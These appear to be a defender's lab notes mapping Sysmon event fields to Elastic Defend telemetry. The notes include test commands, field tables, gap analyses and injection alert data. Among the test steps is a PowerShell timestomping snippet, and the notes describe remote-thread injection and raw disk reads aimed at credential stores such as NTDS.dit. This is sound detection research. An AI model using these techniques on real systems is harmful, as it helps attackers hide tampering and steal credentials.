# Comparision of Sysmon and Elastic Defend fields

## Sysmon Config discoveries
- In the config there needs to be a explicit rule included for the include/exclude RuleGroups to trigger, had missed on the include and did not trigger any eid 6

## EID 1 Process Create
Every CreateProcess call generates EID 1. Sysmon hooks this via kernel process-creation callbacks registered through PsSetCreateProcessNotifyRoutineEx. Elastic Defend generates process events with event.action: start via its kernel-mode driver (ElasticEndpoint.sys), capturing equivalent telemetry through ETW and kernel callbacks.

### Event Generation
```Start-Process olk.exe```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | Sysmon: `technique_id=T1204,technique_name=User Execution`. No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `FileVersion` | `process.pe.file_version` | `-` | Sysmon: `1.2023.918.0` mapped to `process.pe.file_version`. Not present in EDR process event |
| `Description` | `process.pe.description` | `-` | Sysmon: `Microsoft Outlook Installer` via `winlog.event_data.Description`. Not in EDR |
| `Product` | `process.pe.product` | `-` | Sysmon: `Microsoft Outlook Installer` via `winlog.event_data.Product`. Not in EDR |
| `Company` | `process.pe.company` | `-` | Sysmon: `Microsoft Corporation` via `winlog.event_data.Company`. Not in EDR |
| `OriginalFileName` | `process.pe.original_file_name` | `process.pe.original_file_name` | |
| `CommandLine` | `process.command_line` | `process.command_line` | |
| `CurrentDirectory` | `process.working_directory` | `process.working_directory` | |
| `User` | `user.name` | `user.name` | EDR also provides `user.domain` and `user.id` (SID) |
| `LogonGuid` | `winlog.event_data.LogonGuid` | `-` | Not available in EDR |
| `LogonId` | `winlog.event_data.LogonId` | `process.Ext.authentication_id` | Both: `0x6e70a` |
| `TerminalSessionId` | `winlog.event_data.TerminalSessionId` | `process.Ext.session_info.id` | Both: `1` |
| `IntegrityLevel` | `winlog.event_data.IntegrityLevel` | `process.Ext.token.integrity_level_name` | Sysmon: `Medium`, EDR: `medium`. EDR adds `elevation_level: limited` and `token.security_attributes` |
| `Hashes` | `process.hash.sha256` / `process.hash.sha1` / `process.hash.md5` | `process.hash.sha256` | Sysmon: SHA1+MD5+SHA256+IMPHASH. EDR: SHA256 only, plus `process.pe.imphash` separately |
| `ParentProcessGuid` | `process.parent.entity_id` | `process.parent.entity_id` | |
| `ParentProcessId` | `process.parent.pid` | `process.parent.pid` | |
| `ParentImage` | `process.parent.executable` | `process.parent.executable` | |
| `ParentCommandLine` | `process.parent.command_line` | `process.parent.command_line` | |
| `ParentUser` | `winlog.event_data.ParentUser` | `-` | Sysmon: `WIN11\jens`. No equivalent field in EDR |
| `-` | `-` | `process.Ext.ancestry` | EDR only full process chain as list of entity IDs |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only subject, trusted, status, thumbprint for process and parent |
| `-` | `-` | `process.Ext.session_info.*` | EDR only logon type, auth package, user flags, relative logon time |
| `-` | `-` | `process.Ext.token.elevation_level` | EDR only `limited` vs `full` |
| `-` | `-` | `process.Ext.mitigation_policies` | EDR only e.g. `CET dynamic APIs can only be called out of proc` |
| `-` | `-` | `process.Ext.effective_parent.*` | EDR only resolves true effective parent through process hosting, useful for parent spoof detection |
| `-` | `-` | `process.Ext.created_suspended` | EDR only `true` here, flags process hollowing precursor |
| `-` | `-` | `process.parent.Ext.real.*` | EDR only real parent pid/entity_id when reparenting has occurred |
| `-` | `-` | `process.Ext.relative_file_creation_time` | EDR only age of executable on disk in seconds | 

### Analysis
The four PE metadata fields (FileVersion, Description, Product, Company) are a real gap in EDR. A notable EDR only field visible in this sample is process.Ext.effective_parent, which correctly resolves the true grandparent (explorer.exe) even when the immediate parent is a process host. EDR has richer parent context, code signing, token integrity, and session info.


## EID 2 A process changed a file creation time 
Timestomping is a core anti-forensics primitive. Attackers use it to blend malicious files into legitimate-looking timestamps, defeating timeline analysis. Sysmon hooks NtSetInformationFile with FileBasicInformation class. Elastic Defend captures this via file events with event.action: "change".

### Event Generation
```
$file = "C:\Temp\test.txt"
New-Item $file -Force
$fi = [System.IO.FileInfo]$file
$fi.LastWriteTime = "2026-05-26 00:00:00"
$fi.CreationTime  = "2026-05-26 00:00:00"
$fi.LastAccessTime = "2026-05-26 00:00:00"
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | Sysmon: `technique_id=T1099,technique_name=Timestomp DETECT`. No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `TargetFilename` | `file.path` | `file.path` | |
| `CreationUtcTime` | `winlog.event_data.CreationUtcTime` | `-` | the stomped timestamp. Not present in EDR |
| `PreviousCreationUtcTime` | `winlog.event_data.PreviousCreationUtcTime` | `-` | the original timestamp before stomp |
| `User` | `user.name` | `user.name` | EDR also provides `user.domain` and `user.id` (SID) |
| `-` | `-` | `file.Ext.entropy` | EDR only `2.617` entropy of file content |
| `-` | `-` | `file.Ext.header_bytes` | EDR only first bytes of file content in hex |
| `-` | `-` | `file.size` | EDR only file size in bytes |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of the process performing the stomp |

### Analysis
Limited options in EDR to see timestop, can however see events for overwrite, modification, and rename (including fields). Critical gap without the time fields the delta proving timestomping cannot be established from EDR telemetry alone.


## EID 3 Network Connection
Sysmon EID 3 fires on every outbound and inbound TCP/UDP connection, hooking at the WFP (Windows Filtering Platform) kernel layer via FwpmFilterAdd. Elastic Defend captures the same via its kernel driver at the WFP layer, generating network events with event.action: connection_attempted.

### Event Generation
```Invoke-WebRequest -Uri "https://github.com" -UseBasicParsing```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | Sysmon: `technique_id=T1059.001,technique_name=PowerShell`. No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `User` | `user.name` | `user.name` | EDR also provides `user.domain` and `user.id` (SID) |
| `Protocol` | `network.transport` | `network.transport` | Both: `tcp` |
| `Initiated` | `network.direction` | `network.direction` | Sysmon: `true` mapped to `egress`. EDR: `egress` directly |
| `SourceIsIpv6` | `network.type` | `network.type` | Sysmon: `false` mapped to `ipv4`. EDR: `ipv4` directly |
| `SourceIp` | `source.ip` | `source.ip` | |
| `SourceHostname` | `-` | `-` | Sysmon: `-` (not resolved) |
| `SourcePort` | `source.port` | `source.port` | |
| `SourcePortName` | `-` | `-` | Sysmon: `-` (not resolved) |
| `DestinationIsIpv6` | `network.type` | `network.type` | Sysmon: `false` mapped to `ipv4`. EDR: `ipv4` directly |
| `DestinationIp` | `destination.ip` | `destination.ip` | |
| `DestinationHostname` | `-` | `-` | Sysmon: `-` (not resolved) |
| `DestinationPort` | `destination.port` | `destination.port` | |
| `DestinationPortName` | `-` | `-` | Sysmon: `-` (not resolved) |
| `-` | `-` | `destination.geo.*` | EDR only country `SE`, continent `Europe`, lat/lon coordinates |
| `-` | `-` | `destination.as.number` | EDR only ASN `8075` |
| `-` | `-` | `destination.as.organization.name` | EDR only `Microsoft Corporation` |
| `-` | `-` | `process.uptime` | EDR only process age in seconds at time of connection |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of the connecting process |
| `-` | `network.community_id` | `-` | Sysmon (via ECS mapping) only community ID hash for cross-source correlation |

### Analysis
Core network fields are fully equivalent between both sensors IP, port, transport, and direction are all present. EDR is meaningfully richer in two areas GeoIP enrichment and ASN data. The field `process.uptime` is an EDR exclusive field useful for detecting beaconing from freshly spawned processes. 


## EID 4 **SKIPPED**

## EID 5 Process Terminated 
EID 5 fires when any process exits, hooking the same PsSetCreateProcessNotifyRoutineEx callback as EID 1 but on the exit path. Elastic Defend generates a matching process event with event.action: end

### Event Generation
```
Start-Process notepad.exe
Start-Sleep 3
Stop-Process -Name "Notepad" -Force
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `User` | `user.name` | `user.name` | EDR also provides `user.domain` and `user.id` (SID) |
| `-` | `-` | `process.exit_code` | EDR only `0` (clean exit). Sysmon EID 5 does not capture exit code |
| `-` | `-` | `process.hash.sha256` | EDR only hash present on termination event. Sysmon EID 5 does not include hashes |
| `-` | `-` | `process.pe.original_file_name` | EDR only `NOTEPAD.EXE`, revealing masquerading despite renamed binary |
| `-` | `-` | `process.pe.imphash` | EDR only |
| `-` | `-` | `process.command_line` | EDR only full command line on exit event |
| `-` | `-` | `process.parent.*` | EDR only full parent context (executable, pid, command line, entity_id) |
| `-` | `-` | `process.Ext.ancestry` | EDR only full process chain at time of exit |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only signing status of terminated process |
| `-` | `-` | `process.Ext.token.*` | EDR only integrity level, elevation level, security attributes |
| `-` | `-` | `process.Ext.session_info.*` | EDR only logon type, auth package, session id |
| `-` | `-` | `process.Ext.relative_file_creation_time` | EDR only age of executable on disk at time of exit |
| `-` | `-` | `process.Ext.created_suspended` | EDR only — `true`, process was created suspended |
| `-` | `-` | `process.parent.thread.Ext.call_stack_contains_unbacked` | EDR only `true` on parent thread, indicating unbacked memory in call stack (injection indicator) |

### Analysis
EID 5 is Sysmon's leanest event only four fields (timestamp, GUID, PID, image, user). EDR's termination event is richer because it carries the full process context snapshot at exit time. Field `process.exit_code` enables detecting abnormal terminations (non zero exits from normally clean processes can indicate crashes caused by injection) and `process.parent.thread.Ext.call_stack_contains_unbacked: true` on the parent process is an injection indicator.


## EID 6 Driver Loaded
EID 6 fires when a kernel driver is loaded, hooking PsSetLoadImageNotifyRoutine at the kernel level. This could indicate BYOVD attacks, rootkits, and EDR tampering. Elastic Defend captures driver loads via its kernel driver through the same ETW image load notification callback, generating events in endpoint.events.library.

### Event Generation
```
1. Change sysmon conf to include all:
<DriverLoad onmatch="include">
      <ImageLoaded condition="contains">\</ImageLoaded>
      </DriverLoad>
2. Change sysmon conf to not exclude <Signature condition="contains">Microsoft</Signature>
3. Reboot VM
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | identical timestamps |
| `ImageLoaded` | `file.path` | `dll.path` | Sysmon maps to `file.*`, EDR maps to `dll.*` namespace |
| `Hashes` | `file.hash.sha256` / `file.hash.sha1` / `file.hash.md5` | `dll.hash.sha256` | Sysmon: SHA1+MD5+SHA256+IMPHASH. EDR: SHA256 only plus `dll.pe.imphash` separately |
| `Signed` | `winlog.event_data.Signed` | `-` | Sysmon: `true` as string. EDR uses `dll.code_signature.trusted` boolean instead |
| `Signature` | `winlog.event_data.Signature` | `dll.code_signature.subject_name` | Both: `Microsoft Windows` |
| `SignatureStatus` | `file.code_signature.status` | `dll.code_signature.status` | Sysmon: `Valid`. EDR: `trusted`. Different vocabulary for same concept |
| `-` | `file.code_signature.trusted` | `dll.code_signature.trusted` | Both present but under different namespaces |
| `-` | `file.code_signature.valid` | `-` | Sysmon ECS mapping adds `valid` boolean separately from `trusted` |
| `-` | `-` | `dll.code_signature.thumbprint_sha256` | EDR only certificate thumbprint for precise cert identification |
| `-` | `-` | `dll.pe.file_version` | EDR only, not captured by Sysmon EID 6 |
| `-` | `-` | `dll.pe.original_file_name` | EDR only useful for masquerading detection |
| `-` | `file.pe.imphash` | `dll.pe.imphash` | |
| `-` | `-` | `dll.Ext.size` | EDR only |
| `-` | `-` | `dll.Ext.relative_file_creation_time` | EDR only age of driver file on disk in seconds |
| `-` | `-` | `dll.Ext.relative_file_name_modify_time` | EDR only time since last modification in seconds |
| `-` | `-` | `dll.Ext.load_index` | EDR only order in which the driver was loaded during boot sequence |
| `-` | `-` | `process.Ext.protection` | EDR only `PsProtectedSignerWinSystem`, loading process protection level |
| `-` | `-` | `process.uptime` | EDR only system uptime in seconds at time of driver load |
| `-` | `-` | `user.name` / `user.domain` | EDR captures loading user context (`SYSTEM`). Sysmon EID 6 has no user field |

### Analysis
Both captured the same driver load at identical timestamps with good coverage of the core fields. Sysmons maps everything under field `file.*` while EDR under `dll.*`. EDR is richer on PE metadata (file_version, original_file_name) and certificate details (thumbprint_sha256). The `dll.Ext.load_index` field is unique to EDR and useful for detecting drivers loaded late in the boot sequence as an anomaly indicator. Sysmon's edge is the multi hashing (SHA1+MD5) and the separate valid vs trusted boolean split in the ECS mapping where trusted means the cert chain is trusted by Windows, valid means the signature is cryptographically intact, which can differ when a valid signature is signed by an untrusted or expired certificate.


## EID 7 Image Loaded
EID 7 fires on every DLL loaded into a process, hooking PsSetLoadImageNotifyRoutine at the kernel level. Elastic Defend captures DLL loads in `endpoint.events.library` with `event.action: load`, the same dataset as EID 6 but scoped to user mode images rather than kernel drivers.

### Event Generation
```
Identify any normal process which loads a dll file, for example MicrosoftEdgeUpdate.exe AND taskschd.dll
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | identical timestamps |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `ImageLoaded` | `dll.path` | `dll.path` | |
| `FileVersion` | `winlog.event_data.FileVersion` | `dll.pe.file_version` | Sysmon via `winlog.event_data`, EDR natively in `dll.pe.*` |
| `Description` | `winlog.event_data.Description` | `-` | Not present in EDR |
| `Product` | `winlog.event_data.Product` | `-` | Not present in EDR |
| `Company` | `winlog.event_data.Company` | `-` | Not present in EDR |
| `OriginalFileName` | `dll.pe.original_file_name` | `dll.pe.original_file_name` | |
| `Hashes` | `dll.hash.sha256` / `dll.hash.sha1` / `dll.hash.md5` | `dll.hash.sha256` | Sysmon: SHA1+MD5+SHA256+IMPHASH. EDR: SHA256 only plus `dll.pe.imphash` separately |
| `Signed` | `winlog.event_data.Signed` | `-` | Sysmon: `true` as string. EDR uses `dll.code_signature.trusted` boolean instead |
| `Signature` | `dll.code_signature.subject_name` | `dll.code_signature.subject_name` | |
| `SignatureStatus` | `file.code_signature.status` | `dll.code_signature.status` | Sysmon: `Valid`, EDR: `trusted`, different vocabulary |
| `User` | `user.name` | `user.name` | Both: `SYSTEM`. EDR also provides `user.domain` and `user.id` |
| `-` | `file.code_signature.valid` | `-` | Sysmon ECS mapping only, separates cryptographic validity from trust |
| `-` | `-` | `dll.code_signature.thumbprint_sha256` | EDR only, certificate thumbprint for precise cert identification |
| `-` | `-` | `dll.Ext.size` | EDR only |
| `-` | `-` | `dll.Ext.load_index` | EDR only load order index within the process |
| `-` | `-` | `dll.Ext.relative_file_creation_time` | EDR only age of DLL on disk in seconds |
| `-` | `-` | `dll.Ext.relative_file_name_modify_time` | EDR only time since last modification in seconds |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of the loading process |
| `-` | `-` | `process.uptime` | EDR only process age in seconds at time of DLL load (`0` loaded at process start) |

### Analysis
Core fields are well covered in both agents. The Sysmon advantage here is the three PE metadata fields Description, Product, and Company that are absent from EDR. These are valuable for detecting suspicious DLL behaviors. EDR compensates with richer context around the loading process `process.code_signature.*` and DLL file age `relative_file_creation_time`.
Also the `process.uptime: 0` field that checks when the DLL was loaded, at process startup or injected later which is useful for distinguishing legitimate load-time linking from runtime injection.


## EID 8 CreateRemoteThread
EID 8 fires when a process creates a thread in another process via CreateRemoteThread in kernel32.dll and is the Win32 API surface or NtCreateThreadEx via ntdll.dll which is the native NT API one layer below Win32, directly at the syscall boundary. Sysmon hooks the kernel thread creation callback and compares source vs target process to identify cross-process thread creation. It registers a kernel callback via PsSetCreateThreadNotifyRoutine which fires at the kernel level regardless of which user-mode API was used. Elastic Defend captures this via endpoint.events.process with event.action: remote_thread.

### Event Generation
```
Compile and run t1_classic_crt.cpp
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `SourceProcessGuid` | `process.entity_id` | `process.entity_id` | Source (injecting) process. Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `SourceProcessId` | `process.pid` | `process.pid` | Both injecting process |
| `SourceImage` | `process.executable` | `process.executable` | Both injecting process |
| `SourceUser` | `winlog.event_data.SourceUser` | `user.name` | |
| `TargetProcessGuid` | `winlog.event_data.TargetProcessGUID` | `Target.process.entity_id` | EDR uses dedicated `Target.*` namespace |
| `TargetProcessId` | `winlog.event_data.TargetProcessId` | `Target.process.pid` | |
| `TargetImage` | `winlog.event_data.TargetImage` | `Target.process.executable` | |
| `TargetUser` | `winlog.event_data.TargetUser` | `-` | Not a field in EDR api events |
| `NewThreadId` | `winlog.event_data.NewThreadId` | `-` | No thread ID captured in EDR |
| `StartAddress` | `winlog.event_data.StartAddress` | `process.Ext.api.parameters.address` | |
| `StartModule` | `-` | `process.Ext.api.metadata.target_address_name` | Sysmon: `-` (unbacked no module resolved). EDR: `Unbacked` explicitly labeled |
| `StartFunction` | `-` | `-` | Sysmon: `-` (unbacked). EDR has no function name either |
| `-` | `-` | `process.Ext.api.name` | EDR only actual API called: `VirtualAllocEx` / `WriteProcessMemory` |
| `-` | `-` | `process.Ext.api.summary` | EDR only human readable summary e.g. `VirtualAllocEx( Notepad.exe, NULL, 0x1f8, COMMIT\|RESERVE, RWX )` |
| `-` | `-` | `process.Ext.api.behaviors` | EDR only `cross-process`, `image_indirect_call` behavioral classification of the API call |
| `-` | `-` | `process.Ext.api.parameters.protection` | EDR only `RWX` memory protection on allocation |
| `-` | `-` | `process.Ext.api.parameters.size` | EDR only bytes allocated/written |
| `-` | `-` | `process.Ext.api.parameters.allocation_type` | EDR only `COMMIT\|RESERVE` |
| `-` | `-` | `process.code_signature.exists` | EDR only  `false` injecting binary is unsigned |
| `-` | `-` | `Target.process.Ext.created_suspended` | EDR only `true` on target process |
| `-` | `-` | `Target.process.Ext.token.integrity_level_name` | EDR only integrity level of target process |
| `-` | `-` | `event.provider` | EDR only `Microsoft-Windows-Threat-Intelligence` |

### Analysis
Sysmon gives one summarized event at the CreateRemoteThread call. EDR takes a different approach and hooks the ETWTI (ETW Threat Intelligence) provider level and captures every individual API call in the injection chain as a separate events, giving VirtualAllocEx → WriteProcessMemory → CreateRemoteThread as a sequence. EDR captures richer context about the process injection while Sysmon tracks the `NewThreadId` field which could be used for correlating subsequent thread activity.


## EID 9 RawAccessRead
EID 9 fires when a process reads directly from a physical disk or volume using raw device paths like `\\.\PhysicalDrive0` or `\\.\C:`, bypassing the normal filesystem stack that it would normally deny access to. Often to read locked files like NTDS.dit, SAM, SYSTEM hives, and MFT. 

### Event Generation
```
Updated Sysmon conf with <Device condition="contains">\</Device> in Includes
Then in Powershell dir "\\.\C:" 2>$null
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` |  No equivalent in EDR |
| `UtcTime` | `@timestamp` | `-` | EDR generates no event for this activity |
| `ProcessGuid` | `process.entity_id` | `-` | EDR generates no event for this activity |
| `ProcessId` | `process.pid` | `-` | EDR generates no event for this activity |
| `Image` | `process.executable` | `-` | EDR generates no event for this activity |
| `Device` | `file.path` | `-` | EDR generates no event for this activity |
| `User` | `user.name` | `-` | EDR generates no event for this activity |

### Analysis
Confirmed telemetry gap in Elastic Defend. Raw disk reads via device paths (\\.\C:, \Device\HarddiskVolume4 etc) but generated zero events in any EDR dataset.


## EID 10 ProcessAccess
EID 10 fires when a process opens a handle to another process using OpenProcess in kernell32.dll or NtOpenProcess in ntdll.dll to bypass usermode. The key fields are GrantedAccess (the access mask requested) and CallTrace.

### Event Generation
```
Compile and run t1_classic_crt.cpp
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `SourceProcessGUID` | `process.entity_id` | `process.entity_id` | Source (accessing) process. Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `SourceProcessId` | `process.pid` | `process.pid` | |
| `SourceThreadId` | `process.thread.id` | `process.thread.id` | thread making the `OpenProcess` call |
| `SourceImage` | `process.executable` | `process.executable` | |
| `SourceUser` | `winlog.event_data.SourceUser` | `user.name` | |
| `TargetProcessGUID` | `winlog.event_data.TargetProcessGUID` | `Target.process.entity_id` | EDR uses dedicated `Target.*` namespace |
| `TargetProcessId` | `winlog.event_data.TargetProcessId` | `Target.process.pid` | |
| `TargetImage` | `winlog.event_data.TargetImage` | `Target.process.executable` | |
| `TargetUser` | `winlog.event_data.TargetUser` | `-` | Not present in EDR api events |
| `GrantedAccess` | `winlog.event_data.GrantedAccess` | `-` | No access mask field in EDR |
| `CallTrace` | `winlog.event_data.CallTrace` | `-` | No call stack in EDR |
| `-` | `-` | `process.Ext.api.name` | EDR only `WriteProcessMemory` captures subsequent API calls in the injection chain |
| `-` | `-` | `process.Ext.api.summary` | EDR only `WriteProcessMemory( Notepad.exe, Unbacked, 0x1f8 )` human readable injection summary |
| `-` | `-` | `process.Ext.api.behaviors` | EDR only `cross-process`, `image_indirect_call` behavioral classification |
| `-` | `-` | `process.Ext.api.metadata.target_address_name` | EDR only `Unbacked` data written to unbacked memory region |
| `-` | `-` | `process.Ext.api.parameters.address` | EDR only target memory address of the write |
| `-` | `-`| `process.Ext.api.parameters.size` | EDR only bytes written |
| `-` | `-` | `process.code_signature.exists` | EDR only `false` accessing process is unsigned |
| `-` | `-` | `Target.process.Ext.created_suspended` | EDR only `true` on target process |
| `-` | `-` | `Target.process.Ext.token.integrity_level_name` | EDR only integrity level of target process |
| `-` | `-` | `process.parent.executable` | EDR only `cmd.exe` full parent context of the accessing process |
| `-` | `-` | `event.provider` | EDR only `Microsoft-Windows-Threat-Intelligence` ETWTI kernel telemetry source |

**Fields available in EDR Behaviour alerts::**
| Elastic Defend Field | Alert 1 (shellcode_thread) | Alert 2 (Suspended Process Injection) | Alert 3 (Remote Code Injection) | Comment |
|---|---|---|---|---|
| `event.code` | `shellcode_thread` | `behavior` | `behavior` | Alert type classifier |
| `event.action` | `start` | `rule_detection` | `rule_detection` | |
| `event.category` | `malware`, `intrusion_detection` | `malware`, `intrusion_detection` | `malware`, `intrusion_detection` | |
| `event.type` | `info`, `denied` | `info`, `denied` | `info`, `denied` | `denied` = prevented |
| `event.outcome` | `success` | `success` | `success` | Prevention succeeded |
| `event.severity` | `73` | `99` | `73` | Maps to high/critical/high |
| `kibana.alert.severity` | `high` | `critical` | `high` | |
| `kibana.alert.rule.name` | `Memory Threat Prevention Alert: Shellcode Injection` | `Malicious Behavior Prevention Alert: Potential Suspended Process Code Injection` | `Malicious Behavior Prevention Alert: Potential Remote Code Injection` | |
| `kibana.alert.reason` | Human readable summary | Human readable summary | Human readable summary | |
| `kibana.alert.rule.threat` | T1055, T1620 | T1055 | T1055 | MITRE ATT&CK mapping |
| `rule.name` | `-` | `Potential Suspended Process Code Injection` | `Potential Remote Code Injection` | Internal Elastic behavioral rule name |
| `rule.description` | `-` | `Identifies attempts to write to the address space of a remote process that was started in a suspended state...` | `Identifies attempt to allocate an executable memory region in a remote process followed by writing content to it...` | |
| `rule.ruleset` | `production` | `production` | `production` | |
| `Memory_protection.feature` | `shellcode_thread` | `-` | `-` | Only on shellcode_thread alerts |
| `Memory_protection.self_injection` | `true` | `-` | `-` | `false` = remote injection |
| `Memory_protection.unique_key_v1` | present | `-` | `-` | Deduplication/clustering key |
| `Memory_protection.cross_session` | `false` | `-` | `-` | Cross-session injection indicator |
| `Memory_protection.parent_to_child` | `false` | `-` | `-` | Parent-to-child injection indicator |
| `process.executable` | `svchost.exe` | `elastic-agent-9.3.2-windows-x86_64.exe` | `elastic-agent-9.3.2-windows-x86_64.exe` | Injecting process |
| `process.pid` | `3100` | `27400` | `18400` | |
| `process.entity_id` | present | present | present | |
| `process.command_line` | present | present | present | |
| `process.hash.sha256` | present | present | present | |
| `process.pe.imphash` | `-` | `-` | `a7699f9ee3ea2fd5d8a19510b0ebfa15` | |
| `process.exit_code` | `-` | `-` | `1` | Non-zero = abnormal exit |
| `process.code_signature.exists` | `-` | `false` | `false` | Unsigned injecting binary |
| `process.code_signature.status` | `-` | `""` | `""` | Empty = no signature |
| `process.parent.executable` | `services.exe` | `cmd.exe` | `cmd.exe` | |
| `process.thread.id` | `4724` | `4208` | `19272` | Thread performing injection |
| `process.thread.Ext.start_address` | `2361273606784` | `-` | `-` | Only on shellcode_thread |
| `process.thread.Ext.start_address_module` | `Unbacked` | `-` | `-` | Confirms shellcode thread start |
| `process.thread.Ext.start_address_bytes` | `40534883ec20...` | `-` | `-` | Raw bytes usable for YARA/vGrep hunting |
| `process.thread.Ext.start_address_bytes_disasm` | `push rbx; sub rsp, 0x20...` | `-` | `-` | Disassembly of shellcode entry point |
| `process.thread.Ext.call_stack_summary` | `ntdll.dll` | `ntdll.dll\|kernelbase.dll\|elastic-agent...\|kernel32.dll\|ntdll.dll` | `ntdll.dll\|kernelbase.dll\|elastic-agent...\|kernel32.dll\|ntdll.dll` | Compact call stack |
| `process.thread.Ext.call_stack[].symbol_info` | `ntdll.dll!NtCreateThreadEx+0x14`, `kernelbase.dll!CreateRemoteThreadEx+0x29f`, `Unbacked!0x...` (multiple) | `ntdll.dll!NtWriteVirtualMemory+0x14`, `kernelbase.dll!WriteProcessMemory+0xde`, `elastic-agent...+0x4a862` | `ntdll.dll!NtAllocateVirtualMemory+0x14`, `kernelbase.dll!VirtualAllocEx+0x43`, `elastic-agent...+0x4a862` | Full resolved call stack per frame |
| `process.thread.Ext.call_stack[].module_path` | `ntdll.dll`, `kernelbase.dll`, `kernel32.dll`, `Unbacked` (multiple) | present | present | `Unbacked` frames = shellcode |
| `process.thread.Ext.call_stack[].memory_section.protection` | `R-X`, `RWX` | present | present | `RWX` = shellcode memory |
| `process.thread.Ext.call_stack_final_user_module.name` | `-` | `elastic-agent-9.3.2-windows-x86_64.exe` | `elastic-agent-9.3.2-windows-x86_64.exe` | Last non-system module identifies injector |
| `process.thread.Ext.call_stack_final_user_module.path` | `-` | `c:\programdata\elastic-agent...` | `c:\programdata\elastic-agent...` | |
| `process.thread.Ext.call_stack_final_user_module.hash.sha256` | `-` | present | present | Hash of injecting binary |
| `process.thread.Ext.call_stack_final_user_module.code_signature.exists` | `-` | `false` | `false` | |
| `process.thread.Ext.call_stack[].callsite_leading_bytes` | `-` | present | present | Bytes before call instruction |
| `process.thread.Ext.call_stack[].callsite_trailing_bytes` | `-` | present | present | Bytes after call instruction — useful for YARA |
| `process.Ext.api.name` | `-` | `WriteProcessMemory` | `VirtualAllocEx` | API call that triggered detection |
| `process.Ext.api.summary` | `-` | `WriteProcessMemory( svchost.exe, Unbacked, 0xbc000 )` | `VirtualAllocEx( svchost.exe, NULL, 0xbc000, COMMIT\|RESERVE, RWX )` | Human readable API call summary |
| `process.Ext.api.behaviors` | `-` | `cross-process`, `image_indirect_call` | `cross-process`, `image_indirect_call` | Behavioral classification of the API call |
| `process.Ext.api.metadata.target_address_name` | `-` | `Unbacked` | `Unbacked` | Target memory region not backed by a file |
| `process.Ext.api.parameters.address` | `-` | present | present | Target memory address |
| `process.Ext.api.parameters.size` | `-` | `770048` | `770048` | Size of allocation/write |
| `process.Ext.api.parameters.protection` | `-` | `-` | `RWX` | Memory protection flags on allocation |
| `process.Ext.api.parameters.allocation_type` | `-` | `-` | `COMMIT\|RESERVE` | |
| `process.Ext.token.integrity_level_name` | `system` | `high` | `high` | Integrity level of injecting process |
| `process.Ext.code_signature` | trusted (svchost) | `exists: false` | `exists: false` | |
| `process.Ext.ancestry` | present | `-` | `-` | Full process chain |
| `process.Ext.dll.*` | full DLL list | `-` | `-` | Loaded modules — useful for DLL side-loading analysis |
| `Target.process.executable` | `svchost.exe` | `svchost.exe` | `svchost.exe` | Target (injected) process |
| `Target.process.pid` | `3100` | `28572` | `14808` | |
| `Target.process.entity_id` | present | present | present | |
| `Target.process.Ext.created_suspended` | `true` | `true` | `true` | Process was created suspended |
| `Target.process.Ext.token.integrity_level_name` | `system` | `high` | `high` | |
| `Target.process.Ext.memory_region.region_protection` | `RWX` | `RWX` | `RWX` | Memory region is executable |
| `Target.process.Ext.memory_region.allocation_type` | `PRIVATE` | `PRIVATE` | `PRIVATE` | Not file-backed |
| `Target.process.Ext.memory_region.allocation_protection` | `RWX` | `RWX` | `RWX` | |
| `Target.process.Ext.memory_region.memory_pe_detected` | `true` | `true` | `true` | PE structure detected in injected memory |
